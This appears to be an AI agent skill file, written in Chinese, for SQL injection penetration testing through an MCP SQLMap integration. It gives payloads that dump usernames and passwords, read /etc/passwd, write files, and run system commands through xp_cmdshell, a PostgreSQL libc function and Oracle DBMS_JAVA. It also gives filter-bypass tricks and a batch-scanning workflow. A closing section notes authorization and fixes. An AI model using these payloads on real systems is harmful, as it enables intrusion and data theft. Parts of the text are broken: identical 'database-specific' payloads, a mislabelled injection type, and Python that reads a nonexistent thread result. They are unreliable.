---
name: sql-injection-penetration-testing
description: 专业的 SQL 注入渗透测试技能，用于识别和利用 Web 应用程序中的 SQL 注入漏洞。支持经典注入、盲注、时间盲注、二阶注入等多种注入类型，包含完整的 Payload 库、绕过技术和自动化测试流程。适用于安全审计、漏洞评估和渗透测试场景。
---

# SQL 注入渗透测试技能

## 概述

本技能提供专业的 SQL 注入渗透测试能力，帮助识别和利用 Web 应用程序中的 SQL 注入漏洞。基于实际渗透测试经验，包含完整的测试方法论、Payload 库和绕过技术。

## 何时使用此技能

- 对 Web 应用程序进行 SQL 注入漏洞评估
- 测试输入验证和参数化查询机制
- 评估数据库访问控制的有效性
- 进行安全审计和渗透测试
- 学习和研究 SQL 注入攻击技术

## 核心能力

### 1. 漏洞识别
- 识别经典 SQL 注入漏洞
- 识别盲注（Boolean-based）漏洞
- 识别时间盲注（Time-based）漏洞
- 识别联合查询注入漏洞
- 识别二阶注入漏洞
- 识别堆叠查询注入漏洞

### 2. Payload 生成
- 基础注入 Payload
- 联合查询 Payload
- 盲注 Payload
- 时间盲注 Payload
- 数据库特定 Payload
- 编码绕过 Payload

### 3. 过滤绕过
- 关键字过滤绕过
- 特殊字符过滤绕过
- 空格过滤绕过
- 注释符过滤绕过
- WAF 绕过技术
- 编码绕过技术

### 4. 数据提取
- 数据库信息提取
- 表结构提取
- 数据内容提取
- 凭证提取
- 文件读写操作

### 5. 测试执行
- 自动化 Payload 测试
- 手动验证和确认
- 漏洞利用和演示
- 报告生成

## 测试方法论

### 阶段 1：信息收集
1. 识别所有用户输入点
2. 分析输入验证机制
3. 确定数据库类型和版本
4. 检查错误信息泄露
5. 分析请求和响应模式

### 阶段 2：漏洞探测
1. 使用基础 Payload 进行探测
2. 测试不同的注入点
3. 确定注入类型
4. 验证漏洞可利用性
5. **使用 MCP SQLMap 自动扫描**

### 阶段 3：漏洞利用
1. 构造完整的利用链
2. 提取数据库信息
3. 获取敏感数据
4. 演示业务影响
5. 收集证据和截图

### 阶段 4：报告生成
1. 整理发现的漏洞
2. 评估风险等级
3. 提供修复建议
4. 生成详细报告

## MCP SQLMap 自动化扫描流程

### 完整扫描流程

#### 步骤 1：准备 HTTP 请求

从目标应用程序捕获完整的 HTTP 请求报文：

**GET 请求示例**：
```
GET /product?id=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
```

**POST 请求示例**：
```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
User-Agent: Mozilla/5.0

username=admin&password=123
```

**转换为 MCP 格式**：
```
GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n
```

#### 步骤 2：提交扫描任务

使用 `submit_scan` API 提交扫描任务：

```python
task_id = submit_scan(
    http_request="GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
)
```

**返回结果**：
- `task_id`: 任务唯一标识符，用于后续查询

#### 步骤 3：查询扫描状态

使用 `check_scan_status` API 查询任务状态：

```python
status = check_scan_status(task_id)
```

**状态说明**：
- `pending`: 任务已提交，等待执行
- `running`: 任务正在执行中
- `completed`: 任务已完成
- `failed`: 任务执行失败

**轮询示例**：
```python
while True:
    status = check_scan_status(task_id)
    print(f"当前状态: {status}")
    
    if status == "completed":
        print("扫描完成！")
        break
    elif status == "failed":
        print("扫描失败！")
        break
    
    time.sleep(5)
```

#### 步骤 4：获取扫描结果

使用 `get_scan_result` API 获取完整扫描结果：

```python
result = get_scan_result(task_id)
print(result)
```

**扫描结果示例**：
```
🚨 SUCCESS! 发现 SQL 注入漏洞!
📋 检测到的注入类型: Boolean盲注, 报错注入, 时间盲注, 联合查询注入
🎯 注入类型数量: 4

详细信息：
- 注入点: id
- Payload: ' OR 1=1--
- 数据库类型: MySQL
- 数据库版本: 5.7.33
- 当前数据库: testdb
- 当前用户: root@localhost
```

#### 步骤 5：分析扫描结果

解析扫描结果，提取关键信息：

```python
def parse_scan_result(result):
    parsed = {
        "vulnerable": False,
        "injection_types": [],
        "database_info": {},
        "payloads": []
    }
    
    if "SUCCESS" in result:
        parsed["vulnerable"] = True
        
        # 提取注入类型
        if "Boolean盲注" in result:
            parsed["injection_types"].append("boolean")
        if "报错注入" in result:
            parsed["injection_types"].append("error")
        if "时间盲注" in result:
            parsed["injection_types"].append("time")
        if "联合查询注入" in result:
            parsed["injection_types"].append("union")
        
        # 提取数据库信息
        if "数据库类型:" in result:
            parsed["database_info"]["type"] = result.split("数据库类型:")[1].split("\n")[0].strip()
        if "数据库版本:" in result:
            parsed["database_info"]["version"] = result.split("数据库版本:")[1].split("\n")[0].strip()
        if "当前数据库:" in result:
            parsed["database_info"]["name"] = result.split("当前数据库:")[1].split("\n")[0].strip()
        if "当前用户:" in result:
            parsed["database_info"]["user"] = result.split("当前用户:")[1].split("\n")[0].strip()
    
    return parsed

parsed_result = parse_scan_result(result)
print(json.dumps(parsed_result, indent=2))
```

#### 步骤 6：手动验证漏洞

基于扫描结果进行手动验证：

```python
test_payloads = [
    "' OR 1=1--",
    "' UNION SELECT 1,2,3--",
    "' AND SLEEP(5)--"
]

for payload in test_payloads:
    # 发送测试请求
    response = send_request(url, payload)
    
    # 观察响应
    if response_different(response):
        print(f"Payload 成功: {payload}")
        break
```

#### 步骤 7：深入利用漏洞

根据扫描结果深入利用漏洞：

**提取数据库信息**：
```sql
' UNION SELECT database(),user(),version()--
```

**提取表结构**：
```sql
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
```

**提取列信息**：
```sql
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
```

**提取敏感数据**：
```sql
' UNION SELECT username,password,3 FROM users--
```

#### 步骤 8：生成渗透测试报告

基于扫描结果和手动测试生成详细报告：

```python
report = generate_report(
    scan_result=result,
    manual_tests=manual_test_results,
    extracted_data=extracted_data
)

save_report(report, "sql_injection_report.md")
```

### 批量扫描流程

#### 1. 准备多个目标

```python
targets = [
    "GET /product1?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n",
    "GET /product2?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n",
    "GET /product3?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
]
```

#### 2. 并发提交扫描任务

```python
import threading

def scan_target(http_request):
    task_id = submit_scan(http_request=http_request)
    print(f"提交任务: {task_id}")
    
    while True:
        status = check_scan_status(task_id)
        if status in ["completed", "failed"]:
            break
        time.sleep(2)
    
    result = get_scan_result(task_id)
    return result

threads = []
for target in targets:
    thread = threading.Thread(target=scan_target, args=(target,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
```

#### 3. 汇总分析结果

```python
all_results = []
for thread in threads:
    result = thread.result
    all_results.append(result)

# 生成汇总报告
summary = generate_summary_report(all_results)
print(summary)
```

### 混合测试策略

#### 策略 1：快速扫描 + 深入测试

```python
# 阶段 1：使用 MCP SQLMap 快速扫描
http_request = "GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
task_id = submit_scan(http_request=http_request)
result = get_scan_result(task_id)

# 阶段 2：如果发现漏洞，进行深入手动测试
if "SUCCESS" in result:
    print("发现漏洞，开始深入手动测试...")
    
    # 手动提取数据
    manual_extract_data(result)
else:
    print("未发现明显漏洞")
```

#### 策略 2：手动测试 + 自动化验证

```python
# 阶段 1：手动快速测试
quick_test_payload = "' OR 1=1--"
if manual_test_successful(quick_test_payload):
    print("手动测试发现潜在漏洞")
    
    # 阶段 2：使用 MCP SQLMap 验证和深入分析
    http_request = "GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
    task_id = submit_scan(http_request=http_request)
    result = get_scan_result(task_id)
    
    # 阶段 3：基于扫描结果进行利用
    exploit_vulnerability(result)
```

### 完整代码示例

```python
import time
import json

def full_scan_workflow(url):
    """完整的 SQLMap 自动化扫描流程"""
    
    # 步骤 1：准备 HTTP 请求
    http_request = build_http_request(url)
    print(f"准备 HTTP 请求: {http_request}")
    
    # 步骤 2：提交扫描任务
    task_id = submit_scan(http_request=http_request)
    print(f"提交扫描任务: {task_id}")
    
    # 步骤 3：查询扫描状态
    while True:
        status = check_scan_status(task_id)
        print(f"扫描状态: {status}")
        
        if status == "completed":
            break
        elif status == "failed":
            print("扫描失败")
            return None
        
        time.sleep(5)
    
    # 步骤 4：获取扫描结果
    result = get_scan_result(task_id)
    print(f"扫描结果:\n{result}")
    
    # 步骤 5：分析扫描结果
    parsed = parse_scan_result(result)
    print(f"解析结果: {json.dumps(parsed, indent=2)}")
    
    # 步骤 6：手动验证
    if parsed["vulnerable"]:
        print("开始手动验证...")
        manual_verify(url, parsed)
        
        # 步骤 7：深入利用
        print("开始深入利用...")
        exploit_data = exploit_vulnerability(url, parsed)
        
        # 步骤 8：生成报告
        print("生成报告...")
        generate_report(url, parsed, exploit_data)
    else:
        print("未发现漏洞")
    
    return parsed

def parse_scan_result(result):
    """解析扫描结果"""
    parsed = {
        "vulnerable": False,
        "injection_types": [],
        "database_info": {},
        "payloads": []
    }
    
    if "SUCCESS" in result:
        parsed["vulnerable"] = True
        
        if "Boolean盲注" in result:
            parsed["injection_types"].append("boolean")
        if "报错注入" in result:
            parsed["injection_types"].append("error")
        if "时间盲注" in result:
            parsed["injection_types"].append("time")
        if "联合查询注入" in result:
            parsed["injection_types"].append("union")
        
        if "数据库类型:" in result:
            parsed["database_info"]["type"] = result.split("数据库类型:")[1].split("\n")[0].strip()
        if "数据库版本:" in result:
            parsed["database_info"]["version"] = result.split("数据库版本:")[1].split("\n")[0].strip()
        if "当前数据库:" in result:
            parsed["database_info"]["name"] = result.split("当前数据库:")[1].split("\n")[0].strip()
        if "当前用户:" in result:
            parsed["database_info"]["user"] = result.split("当前用户:")[1].split("\n")[0].strip()
    
    return parsed

def manual_verify(url, parsed):
    """手动验证漏洞"""
    test_payloads = [
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--"
    ]
    
    for payload in test_payloads:
        print(f"测试 Payload: {payload}")
        # 发送测试请求
        # 观察响应
        pass

def exploit_vulnerability(url, parsed):
    """利用漏洞提取数据"""
    # 提取数据库信息
    # 提取表结构
    # 提取敏感数据
    pass

def generate_report(url, parsed, exploit_data):
    """生成渗透测试报告"""
    report = f"""
    # SQL 注入渗透测试报告
    
    ## 目标信息
    - URL: {url}
    - 数据库类型: {parsed['database_info'].get('type', 'Unknown')}
    - 数据库版本: {parsed['database_info'].get('version', 'Unknown')}
    - 当前数据库: {parsed['database_info'].get('name', 'Unknown')}
    - 当前用户: {parsed['database_info'].get('user', 'Unknown')}
    
    ## 漏洞信息
    - 注入类型: {', '.join(parsed['injection_types'])}
    - 漏洞存在: {'是' if parsed['vulnerable'] else '否'}
    
    ## 提取的数据
    {exploit_data}
    """
    
    with open("sql_injection_report.md", "w") as f:
        f.write(report)
    
    print("报告已生成: sql_injection_report.md")

# 使用示例
if __name__ == "__main__":
    url = "http://example.com/product?id=1"
    full_scan_workflow(url)
```

## 数据库类型识别

### MySQL
```sql
' OR 1=1--
' OR 1=1#
```

### PostgreSQL
```sql
' OR 1=1--
' OR 1=1--
```

### SQL Server
```sql
' OR 1=1--
' OR 1=1--
```

### Oracle
```sql
' OR '1'='1'--
' OR '1'='1'--
```

### SQLite
```sql
' OR 1=1--
' OR 1=1--
```

## 注入类型

### 1. 经典注入（In-band）
- 联合查询注入
- 错误注入

### 2. 盲注（Inferential）
- 布尔盲注
- 时间盲注

### 3. 二阶注入（Out-of-band）
- 存储后触发
- 延迟执行

### 4. 堆叠查询注入
- 多语句执行
- 数据库特定

## 参考资料

详细的 Payload 库和绕过技术请参考：
- [SQL 注入 Payload 和绕过技术完整指南](references/sql-injection-payload-guide.md)
- [过滤器绕过速查表](references/filter-bypass-cheatsheet.md)
- [数据外带验证速查表](references/data-exfiltration-cheatsheet.md)
- [MCP SQLMap 使用指南](references/mcp-sqlmap-guide.md)
- [渗透测试报告模板](references/penetration-test-report-template.md)

## 使用示例

### 示例 1：基础 SQL 注入测试
```
用户：测试 https://example.com/product?id=1 是否存在 SQL 注入漏洞

执行步骤：
1. 访问目标 URL
2. 在参数中注入基础 Payload：' OR 1=1--
3. 观察响应变化
4. 如果存在过滤，尝试绕过技术
5. 验证漏洞并记录证据
```

### 示例 2：联合查询注入
```
用户：提取数据库表结构

执行步骤：
1. 确定列数：ORDER BY 1--
2. 确定显示位置：UNION SELECT 1,2,3--
3. 提取数据库信息：UNION SELECT database(),user(),version()--
4. 提取表名：UNION SELECT table_name FROM information_schema.tables--
5. 提取列名：UNION SELECT column_name FROM information_schema.columns--
```

### 示例 3：盲注测试
```
用户：测试是否存在盲注漏洞

执行步骤：
1. 注入布尔条件：' AND 1=1--
2. 注入布尔条件：' AND 1=2--
3. 观察响应差异
4. 使用时间盲注：' AND SLEEP(5)--
5. 验证漏洞并记录证据
```

### 示例 4：过滤绕过测试
```
用户：输入点过滤了空格和关键字，如何绕过？

执行步骤：
1. 尝试注释符替代空格：'/**/OR/**/1=1--
2. 尝试换行符替代空格：'%0AOR%0A1=1--
3. 尝试编码绕过：%27%20OR%201%3D1--
4. 尝试大小写绕过：' oR 1=1--
5. 验证成功的 Payload
```

### 示例 5：生成渗透测试报告
```
用户：为发现的 SQL 注入漏洞生成详细报告

执行步骤：
1. 整理漏洞信息（位置、类型、Payload）
2. 评估风险等级（CVSS 评分）
3. 提供修复建议
4. 生成包含证据的详细报告
```

### 示例 6：使用 MCP SQLMap 自动扫描
```
用户：使用 MCP SQLMap 自动扫描目标 URL

执行步骤：
1. 准备 HTTP 请求报文
2. 调用 submit_scan 提交扫描任务
3. 使用 check_scan_status 查询扫描状态
4. 使用 get_scan_result 获取扫描结果
5. 分析扫描结果并生成报告
```

### 示例 7：MCP SQLMap 批量扫描
```
用户：批量扫描多个 URL 的 SQL 注入漏洞

执行步骤：
1. 准备多个 HTTP 请求报文
2. 并发调用 submit_scan 提交多个扫描任务
3. 使用 list_all_tasks 查看所有任务状态
4. 逐个获取扫描结果
5. 汇总分析并生成报告
```

## 安全注意事项

- 仅在授权范围内进行测试
- 避免对生产环境造成破坏
- 不要删除或修改真实数据
- 及时报告发现的漏洞
- 遵守相关法律法规
- 保护测试过程中获取的敏感信息

## 工具推荐

### 自动化扫描工具

#### MCP SQLMap 集成
本技能已集成 MCP SQLMap 服务器，提供自动化 SQL 注入扫描能力。

**MCP SQLMap 功能**：
- ✅ 自动化 SQL 注入检测
- ✅ 支持异步任务处理
- ✅ 完整的 HTTP 请求分析
- ✅ 智能识别 4 种注入类型
- ✅ 后台并发扫描

**MCP SQLMap API 接口**：
1. `submit_scan` - 提交扫描任务
2. `check_scan_status` - 查询扫描状态
3. `get_scan_result` - 获取扫描结果
4. `list_all_tasks` - 列出所有任务

**支持的注入类型**：
- Boolean 盲注
- 报错注入
- 时间盲注
- 联合查询注入

详细使用方法请参考：[MCP SQLMap 使用指南](references/mcp-sqlmap-guide.md)

#### 其他工具
- Burp Suite / OWASP ZAP
- SQLNinja
- Havij
- NoSQLMap
- Commix

## 学习资源

- OWASP SQL 注入防护速查表
- PortSwigger SQL 注入实验室
- SQLMap 官方文档
- HackerOne 漏洞报告
- CWE-89: SQL 注入

## 数据库特定 Payload

### MySQL
```sql
-- 版本信息
SELECT @@version

-- 当前用户
SELECT user()

-- 当前数据库
SELECT database()

-- 读取文件
SELECT LOAD_FILE('/etc/passwd')

-- 写入文件
SELECT 'test' INTO OUTFILE '/tmp/test.txt'
```

### PostgreSQL
```sql
-- 版本信息
SELECT version()

-- 当前用户
SELECT user

-- 当前数据库
SELECT current_database()

-- 执行命令
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
```

### SQL Server
```sql
-- 版本信息
SELECT @@version

-- 当前用户
SELECT SYSTEM_USER

-- 当前数据库
SELECT DB_NAME()

-- 执行命令
EXEC xp_cmdshell 'dir'
```

### Oracle
```sql
-- 版本信息
SELECT * FROM v$version

-- 当前用户
SELECT user FROM dual

-- 执行命令
BEGIN DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id'); END;
```

## 风险评估

### 高风险
- 能够提取敏感数据（密码、信用卡号等）
- 能够执行系统命令
- 能够读写服务器文件
- 能够完全控制数据库

### 中风险
- 能够提取非敏感数据
- 能够绕过认证
- 能够修改数据

### 低风险
- 仅能证明漏洞存在
- 无法提取有用数据
- 影响范围有限

## 修复建议

### 输入验证
- 使用白名单验证
- 严格类型检查
- 长度限制

### 参数化查询
- 使用预处理语句
- 使用存储过程
- 使用 ORM 框架

### 最小权限原则
- 限制数据库用户权限
- 禁用危险函数
- 禁止文件读写

### 错误处理
- 不显示详细错误信息
- 使用通用错误消息
- 记录错误日志

### WAF 部署
- 部署 Web 应用防火墙
- 配置适当的规则
- 定期更新规则库
